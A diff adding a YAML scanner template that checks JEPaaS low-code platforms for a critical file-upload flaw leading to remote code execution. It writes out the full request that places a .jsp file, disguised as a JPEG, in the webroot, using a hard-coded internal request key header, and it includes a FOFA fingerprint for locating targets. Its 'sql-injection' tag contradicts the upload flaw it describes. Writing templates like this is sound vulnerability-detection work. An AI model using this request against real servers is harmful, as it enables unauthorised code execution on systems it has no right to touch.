@@ -1,0 +1,32 @@
+id: poc-yaml-jepaas-document-upload-rce
+info:
+  name: JEPaaS低代码平台document存在文件上传致RCE漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: jepaas低代码平台
+  fofa: icon_hash="-999810473"
+requests:
+- method: POST
+  path: /je/document/file?bucket=webroot
+  headers:
+    Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+    Accept: application/json, text/javascript, */*; q=0.01
+    internalRequestKey: schedule_898901212
+  data: '------21909179191068471382830692394
+
+    Content-Disposition: form-data; name="files"; filename="2214.jsp"
+
+    Content-Type: image/jpeg
+
+
+    123
+
+    ------21909179191068471382830692394--
+
+    '
+  expression: "status_code == 200 && \ncontains(headers,\"application/json\") &&\n\
+    contains(body,\"\\\"message\\\":\\\"操作成功\\\"\") &&\ncontains(body,\"createTime\"\
+    ) &&\ncontains(body,\"fileKey\")\n"
+variables: {}
+transport: http
